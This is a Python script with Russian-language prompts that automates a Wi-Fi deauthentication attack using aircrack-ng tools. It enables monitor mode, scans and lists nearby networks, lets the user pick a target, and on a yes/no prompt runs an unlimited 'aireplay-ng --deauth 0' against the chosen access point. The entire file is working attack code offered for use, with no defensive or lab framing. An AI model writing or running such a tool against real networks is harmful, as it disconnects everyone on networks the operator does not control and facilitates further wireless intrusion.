#!/usr/bin/env python3
import os
import time
import subprocess

print("="*50)
print("WiFi SCANNER - ВЫБОР ИЗ СПИСКА")
print("="*50)

# 1. Включаем мониторный режим
print("\n[1] Включаю мониторный режим...")
os.system("sudo airmon-ng start wlan0")
time.sleep(2)

# 2. Сканируем сети с реальным выводом
print("\n[2] Сканирую сети... (нажми Ctrl+C когда увидишь нужные сети)")
print("="*50)

# Запускаем airodump-ng и захватываем вывод
process = subprocess.Popen(
    "sudo airodump-ng wlan0mon",
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True
)

# Собираем сети из вывода в реальном времени
networks = []
try:
    for line in process.stdout:
        line = line.rstrip()
        print(line)  # Показываем вывод
        
        # Парсим строки с сетями (ищем MAC адреса)
        if len(line) > 30 and ':' in line[:17] and line[2] == ':':
            parts = line.split()
            if len(parts) >= 6:
                # Проверяем что это MAC (00:11:22:33:44:55)
                if len(parts[0]) == 17 and parts[0].count(':') == 5:
                    bssid = parts[0]
                    channel = parts[5] if parts[5].isdigit() else "1"
                    
                    # ESSID может быть после 13-го элемента
                    essid = ' '.join(parts[13:]) if len(parts) > 13 else "[Hidden]"
                    
                    networks.append((bssid, channel, essid[:30]))
                    
except KeyboardInterrupt:
    print("\n[✓] Сканирование остановлено")
    process.terminate()

print("="*50)

# 3. Показываем список найденных сетей
if networks:
    print(f"\n[3] Найдено сетей: {len(networks)}")
    print("-" * 50)
    
    # Показываем только первые 10
    for i, (bssid, channel, essid) in enumerate(networks[:10], 1):
        print(f"[{i}] {essid}")
        print(f"    Канал: {channel} | MAC: {bssid}")
        print()
    
    # 4. Выбор сети
    try:
        choice = int(input(f"Выбери сеть (1-{min(10, len(networks))}): "))
        if 1 <= choice <= len(networks):
            bssid, channel, essid = networks[choice-1]
            
            print(f"\n[✓] Выбрано: {essid}")
            print(f"    Канал: {channel}")
            print(f"    MAC: {bssid}")
            
            # 5. Меняем канал
            print(f"\n[4] Меняю канал на {channel}...")
            os.system(f"sudo iw dev wlan0mon set channel {channel}")
            time.sleep(1)
            
            # 6. Deauth
            if input("\n[5] Запустить deauth атаку? (y/n): ").lower() == "y":
                print(f"\n[!] Запускаю deauth на {essid}")
                print("[!] Нажми Ctrl+C чтобы остановить")
                print("-" * 50)
                os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon")
    except (ValueError, KeyboardInterrupt):
        print("\n[!] Отмена выбора")
else:
    print("\n[!] Сети не найдены")

# 7. Восстановление
print("\n[6] Выключаю мониторный режим...")
os.system("sudo airmon-ng stop wlan0mon")
print("\n✅ Готово!")